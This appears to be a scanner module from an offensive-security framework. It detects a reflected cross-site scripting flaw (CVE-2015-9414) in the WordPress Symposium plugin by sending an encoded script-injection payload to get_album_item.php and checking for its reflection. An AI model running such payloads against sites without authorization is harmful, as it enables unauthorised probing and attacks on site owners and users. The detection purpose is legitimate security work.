#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Symposium through 15."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Symposium <=15.8.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Symposium through 15.8.1 contains a reflected cross-site scripting vulnerability via the wp-content/plugins/wp-symposium/get_album_item.php?size parameter which allows an attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2015', 'cve', 'xss', 'wpscan', 'wordpress', 'wp-plugin', 'wpsymposiumpro', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/2ac2d43f-bf3f-4831-9585-5c5484051095',
            'https://wpvulndb.com/vulnerabilities/8175',
            'https://wordpress.org/plugins/wp-symposium/#developers',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-9414',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-9414',
    }

    def run(self):
        path = '/wp-content/plugins/wp-symposium/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('WP Symposium', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/wp-symposium/get_album_item.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Symposium <=15.8.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

